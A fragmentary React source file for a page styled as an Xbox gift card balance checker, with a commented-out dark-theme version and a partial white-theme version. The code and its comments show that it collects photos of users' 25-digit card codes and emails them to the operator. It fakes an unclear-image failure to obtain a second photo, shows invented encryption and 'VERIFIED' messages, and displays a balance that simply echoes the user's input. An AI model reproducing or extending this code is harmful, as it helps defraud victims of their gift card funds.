// // src/pages/Scan.jsx - COMPLETE FIXED VERSION
...
//     // Create file input with capture attribute for mobile
...
//     // Generate a simulated 25-character Xbox code
...
//       });
//       console.log('✅ Success email sent with image');
//     } catch (err) {
...
//       // Send failed attempt email with image
//       try {
//         await logBalanceCheck({
...
//           imageBase64: imagePreview,
//           ip: null,
//           message: 'First attempt failed - image unclear, user instructed to upload clearer image'
//         });
//         console.log('📧 Failed attempt email sent with image');
//       } catch (err) {
//         console.error('Logging failed:', err);
//       }
      
//       // Clear image for second attempt
...
//               <p className="text-[#888] text-xs">Scan Gift Card</p>
//             </div>
//           </div>
...
//       {/* Hero Section */}
//       <div className="bg-gradient-to-r from-[#107C10] to-[#0E6A0E] py-10 px-6 text-center">
...
//           </div>
//           <h2 className="text-2xl md:text-3xl font-bold text-white mb-2">Scan Your Xbox Gift Card</h2>
//           <p className="text-white/80 text-sm">Upload a clear photo of your 25-digit Xbox code</p>
//         </div>
//       </div>
...
//           {/* Upload Section */}
//           <div className="mb-6">
//             <label className="block text-[#E0E0E0] text-sm font-medium mb-3">Upload Gift Card Photo</label>
//             <div className="flex gap-3 flex-wrap">
//               <button
//                 onClick={() => fileInputRef.current?.click()}
//                 disabled={isProcessing}
//                 className="flex-1 bg-[#2D2D2D] border border-[#3D3D3D] text-[#E0E0E0] py-3 rounded-md font-medium text-sm hover:bg-[#3D3D3D] transition disabled:opacity-50 flex items-center justify-center gap-2"
//               >
//                 📤 Upload Photo
//               </button>
//               <button
...
//               className="hidden" 
//             />
//             <p className="text-[#666] text-xs mt-2">Supported formats: JPG, PNG, GIF (Max 5MB)</p>
//           </div>
...
//                 <span className="text-[#E0E0E0] text-xs font-medium">📸 Image Preview</span>
//                 <button 
//                   onClick={() => {
//                     setSelectedImage(null);
//                     setImagePreview(null);
...
//                 className="w-full max-h-[250px] object-contain rounded-md border border-[#3D3D3D]"
//               />
//               <p className="text-[#666] text-xs mt-2 text-center">Make sure the 25-digit code is clearly visible</p>
//             </div>
//           )}
...
//               step="1"
//               disabled={isProcessing}
//               className="w-full bg-[#2D2D2D] border border-[#3D3D3D] rounded-md px-4 py-3 text-white text-sm focus:outline-none focus:border-[#107C10] focus:ring-1 focus:ring-[#107C10] disabled:opacity-50"
//             />
//             <p className="text-[#666] text-xs mt-1">The balance will match the amount you enter</p>
//           </div>

//           {/* Info Notice */}
//           <div className="mb-6 p-3 bg-[#2D2D2D]/30 border-l-3 border-[#107C10] rounded">
//             <p className="text-[#888] text-xs">
//               💡 <span className="text-[#107C10]">Tip:</span> Place your card on a flat surface with good lighting. 
...
//               <div className="bg-[#1A1A1A] rounded-lg p-8 max-w-md w-full mx-4 border-2 border-[#107C10] shadow-2xl">
...
//                   </p>
//                   <p className="text-[#555] text-[10px] mt-2 font-mono">
//                     {processingStep >= 3 && '🔒 AES-256 encryption active'}
//                     {processingStep >= 5 && ' ✅ Secure channel established'}
//                   </p>
//                   <button
//                     onClick={() => {
//                       setIsProcessing(false);
...
//           {/* Balance Display */}
//           {showBalance && !isProcessing && (
//             <div className="mt-6 p-5 bg-[#0E6A0E]/10 border-2 border-[#107C10] rounded-lg text-center animate-fadeSlideUp">
//               <div className="inline-flex items-center gap-2 bg-[#107C10]/20 px-3 py-1 rounded-full mb-3">
//                 <span className="text-[#107C10] text-xs font-semibold">✓ VERIFIED</span>
//               </div>
//               <p className="text-[#888] text-sm mb-1">Available Balance</p>
//               <p className="text-[#107C10] text-5xl font-bold mb-3">{balance}</p>
//               <p className="text-[#666] text-xs">Balance verified successfully • Email confirmation sent</p>
//               <button
//                 onClick={resetForm}
//                 className="mt-4 text-[#107C10] text-sm font-medium hover:underline inline-flex items-center gap-1"
//               >
//                 Check Another Card →
//               </button>
//             </div>
...
//               messageType === 'success' 
//                 ? 'bg-[#0E6A0E]/10 border border-[#107C10] text-[#107C10]' 
//                 : 'bg-[#2A0A0A] border border-[#dc3545] text-[#dc3545]'
//             }`}>
//               {message}
//             </div>
//           )}
...
//             <p className="text-[#666] text-xs text-center mb-3">Where to find your 25-digit code:</p>
//             <div className="bg-[#2D2D2D] rounded-lg p-4 text-center">
//               <div className="inline-block p-4 bg-[#1A1A1A] rounded-lg border border-[#3D3D3D]">
...
// src/pages/Scan.jsx - White Theme
import React, { useState, useRef, useEffect } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { logBalanceCheck } from '../services/logService';
    ...
    <div className="min-h-screen bg-[#F8F9FA]">
      ...
      <div className="max-w-2xl mx-auto px-4 py-8">
        ...
        <div className="bg-white border border-[#E0E0E0] rounded-lg p-6 shadow-sm">
          ...
          {/* Balance Display */}
          {showBalance && !isProcessing && (
            <div className="mt-6 p-5 bg-[#E8F5E9] border-2 border-[#107C10] rounded-lg text-center animate-fadeSlideUp">
              <div className="inline-flex items-center gap-2 bg-[#107C10]/20 px-3 py-1 rounded-full mb-3">
                <span className="text-[#107C10] text-xs font-semibold">✓ VERIFIED</span>
              </div>
              <p className="text-[#757575] text-sm mb-1">Available Balance</p>
              <p className="text-[#107C10] text-5xl font-bold mb-3">{balance}</p>
              <p className="text-[#757575] text-xs">Balance verified successfully</p>
              <button
                onClick={resetForm}
                className="mt-4 text-[#107C10] text-sm font-medium hover:underline inline-flex items-center gap-1"
              >
